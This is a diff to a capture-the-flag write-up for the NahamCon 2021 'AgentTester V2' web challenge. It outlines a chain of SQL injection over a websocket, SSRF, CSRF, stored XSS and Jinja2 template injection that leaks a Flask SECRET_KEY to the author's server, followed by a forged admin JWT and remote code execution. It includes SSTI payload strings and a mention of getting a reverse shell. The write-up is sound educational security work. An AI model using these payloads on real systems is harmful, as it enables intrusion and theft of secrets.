@@ -10,21 +10,19 @@ tags: [ctf, NahamCon CTF, web]
  * Type: Web
  * Points: 500 pts
  * Description: 
+ > The new developer we hired did a bad job and we got pwned. We hired someone else to fix the issue.
+ >
+ > Author: @jorgectf#3896
+ >
+ > Source: https://ctf.nahamcon.com/files/354c72ad810a5c9e05c55bc3c6cb6e35/agenttesterV2.zip or [mirror](https://github.com/sajjadium/CTFium/)
 
-> The new developer we hired did a bad job and we got pwned. We hired someone else to fix the issue.
-> Author: @jorgectf#3896
-> Source: https://ctf.nahamcon.com/files/354c72ad810a5c9e05c55bc3c6cb6e35/agenttesterV2.zip
-
-The challenge
-=============
-
-Union SQLi via websocket to SSRF bot to my own site hosting a CSRF to make bot update its profile with a PXSS in the `about` field which exploits a Jinja2 SSTI to exfil the Flask config back to my own server, then forge admin JWT using `SECRET_KEY` and gain RCE through the SSTI.
+Union SQLi via websocket to SSRF bot to my own site hosting a CSRF to make bot update its profile with a PXSS in the `about` field. The XSS exploits a Jinja2 SSTI on `/debug` and exfils the Flask config back to my own server. Forge admin JWT using `SECRET_KEY` and exploit SSTI directly to gain RCE.
 
 Surprisingly my solution was unintended, see the author's [write up](https://github.com/jorgectf/Created-CTF-Challenges/tree/main/challenges/AgentTester%20@%20NahamConCTF%202021) for the intended solution.
 
 <!--more-->
 
-The first version of `AgentTester` had an unintended solution so the author released a second version where we could no longer retrieve the admin plain password via the union SQLi (user passwords are now hashed with bcrypt).
+The first version of `AgentTester` had an unintended solution so the author released a second version where we could no longer retrieve the admin plain password via the union SQLi (user passwords now hashed with bcrypt).
 
 Route `/req` is vuln to sqli via websocket. Make bot visit our site via union query.
 ```
@@ -32,7 +30,7 @@ Route `/req` is vuln to sqli via websocket. Make bot visit our site via union qu
 <- To Client: Testing User-Agent: Woot in url: http://me.com/
 ```
 
-I used the below `index.html` to CSRF the bot. The response to the `POST /profile/1` request then includes the XSS which exfils the Flask config via the `/debug` endpoint. 
+I used the below `index.html` to CSRF the bot. The response to the `POST /profile/1` request then includes the XSS which exfils the Flask config.
 <!-- {% raw %} -->
 ```html
 <!DOCTYPE html>
@@ -47,6 +45,7 @@ I used the below `index.html` to CSRF the bot. The response to the `POST /profil
 </html>
 ```
 <!-- {% endraw %} -->
+_I html-encoded `<` because vscode syntax parsing was complaining but it may be unnecessary._
 
 Check our web logs.
 ```
@@ -63,7 +62,7 @@ Accept-Language: en-US
 ```
 
 Decode the Flask config.
-```js
+```conf
 <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': '1L5&wqXM+kz5nIh4!Rz6Ufo^iY?aRyV2', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'auth2', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite:///DB/db.sqlite', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}}>
 ```
 
@@ -159,7 +158,9 @@ posix-linux $
 
 Flag: `CHALLENGE_FLAG=flag{6daf77ca9478a1be670acd4547f4976a}`
 
-Alternative solutions AFAIK:
-* CSRF bot to POST to `/debug` and get a reverse shell via the SSTI, see [this poc](https://discord.com/channels/598608711186907146/820748103657193472/820756728055726142) by `@BronyUraj#6953`
-* Simplify the XSS to just exfil the flag using {%raw%}`code={{environ}}`{%endraw%} because of this line `app.jinja_env.globals.update(environ=os.environ.get)` in `app/backend/backend.py`
-* Use another challenge on the `challenge.nahamcon.com` domain to host a PHP script, and SSRF puppeteer via union sqli to net the `auth2` admin cookie. This works because the puppeteer cookie is set with `domain: challenge.nahamcon.com` in `app/browser/browser.js` 
+Alternative solutions seen on Discord:
+* CSRF bot to POST to `/debug` and get a reverse shell via SSTI (e.g. using [this code](https://discord.com/channels/598608711186907146/820748103657193472/820756728055726142) by `@BronyUraj#6953`)
+* Simplify the XSS to just exfil the flag using {%raw%}`code={{environ("CHALLENGE_FLAG")}}`{%endraw%} because of this line `app.jinja_env.globals.update(environ=os.environ.get)` in `app/backend/backend.py` (thx to `Gnarf#3685` and the author `@congon4tor#2334` for pointing it out). Otherwise just use `config.__class__.__init__.__globals__['os'].environ`
+* Use another challenge on the `challenge.nahamcon.com` domain to host a PHP script, and SSRF bot via union sqli to net the `auth2` admin cookie. This works because the puppeteer cookie is set with `domain: challenge.nahamcon.com` in `app/browser/browser.js` (credits to `@liath#3287` for this sneaky [solution](https://discord.com/channels/598608711186907146/820748103657193472/820764258480422952))
+
+[@lanjelot](https://twitter.com/lanjelot)
